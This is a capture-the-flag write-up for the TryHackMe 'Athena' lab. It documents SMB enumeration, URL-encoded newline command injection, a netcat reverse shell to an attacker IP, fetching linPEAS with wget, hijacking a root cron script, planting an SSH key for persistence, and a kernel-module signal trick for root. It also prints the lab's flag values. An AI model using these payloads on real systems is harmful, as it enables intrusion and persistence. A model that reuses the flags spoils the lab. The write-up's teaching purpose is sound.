TryHackMe – Athena Write-Up
Overview

This machine focuses on:

SMB enumeration

Web command injection

Reverse shell exploitation

Cron-based privilege escalation

Kernel module analysis using Ghidra

Initial Enumeration
Nmap Scan
nmap -sC -sV -p- 10.10.8.73

Open Ports
Port	Service
22	SSH (OpenSSH 8.2p1)
80	HTTP (Apache 2.4.41)
139	SMB
445	SMB
SMB Enumeration

Since ports 139/445 are open, SMB enumeration is the first step.

smbclient -L //10.10.8.73

Shares Found

public

IPC$ (no access)

Connecting to the public share:

smbclient //10.10.8.73/public


Inside the share, a message file was discovered and downloaded using:

get <filename>

Key Information Found

The message referenced a hidden web directory:

/myrouterpanel

Web Enumeration (Port 80)

Visiting the homepage reveals a basic site themed around Athena.
Directory enumeration did not initially reveal anything useful:

dirsearch -u http://10.10.8.73


However, navigating directly to:

http://10.10.8.73/myrouterpanel


revealed a Simple Router Panel with a ping tool.

Command Injection Discovery

Testing the ping field showed:

Certain characters were filtered

Normal command injection (;, &&) failed

URL-encoded newline injection worked

Payload

\n → URL encoded as %0a

Example test:

%0a id


This confirmed command execution.

Reverse Shell (www-data)

A Netcat reverse shell was injected:

ip=%0A nc -e /bin/bash 10.14.88.47 4433&submit=


Listener:

nc -lvnp 4433


Shell received as:

www-data

Shell Stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo; fg

Local Enumeration (linPEAS)

A local HTTP server was started:

python3 -m http.server 8000


linPEAS transferred and executed:

wget http://10.14.88.47:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

Key Finding

A writable cron-executed script:

/var/share/backup/backup.sh


Writable by www-data and athena, executed as root.

Privilege Escalation → Athena

The script was modified to include another reverse shell.

After cron execution (~60s), a shell was received as:

athena

SSH Persistence

To gain a stable shell, SSH keys were generated:

ssh-keygen -t rsa


Public key added:

echo "PUBLIC_KEY" >> /home/athena/.ssh/authorized_keys


SSH access:

ssh -i id_rsa athena@10.10.8.73

User Flag
cat user.txt


User Flag

857c4a4fbac638afb6c7ee45eb3e1a28

Privilege Escalation → Root
Sudo Enumeration
sudo -l


Allowed command:

/usr/sbin/insmod /mnt/.../secret/venom.ko


This indicates kernel module exploitation.

Kernel Module Analysis (Ghidra)

The file venom.ko was transferred to the attacker machine and analyzed using Ghidra.

Key function discovered:

if (param == 0x39) {
    give_root();
}


Hex 0x39 → Decimal 57

Root Exploitation

Triggering the condition:

kill -57 0


Result:

root

Root Flag
cat /root/root.txt


Root Flag

aecd4a3497cd2ec4bc71a2315030bd48

Attack Chain Summary

SMB anonymous enumeration

Information disclosure via public share

Hidden web directory discovery

Command injection via newline (%0a)

Reverse shell as www-data

linPEAS enumeration

Cron script abuse → athena

SSH persistence

Kernel module reverse engineering

Signal abuse → root

Final Flags
Flag	Value
User	857c4a4fbac638afb6c7ee45eb3e1a28
Root	aecd4a3497cd2ec4bc71a2315030bd48